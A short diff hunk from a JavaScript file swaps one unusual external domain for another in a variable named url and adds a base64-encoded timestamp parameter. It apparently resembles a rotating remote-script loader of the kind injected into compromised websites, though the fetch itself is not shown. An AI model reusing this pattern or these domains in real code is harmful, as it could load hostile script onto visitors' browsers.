@@ -162,7 +162,7 @@
 		
 		var date = new Date();
 		 
-		var url = '//stprq-online.xyz';
+		var url = '//kookwilt.cyou';
 		
 		var ts = '?ts=' + btoa(date.getMilliseconds());
 		
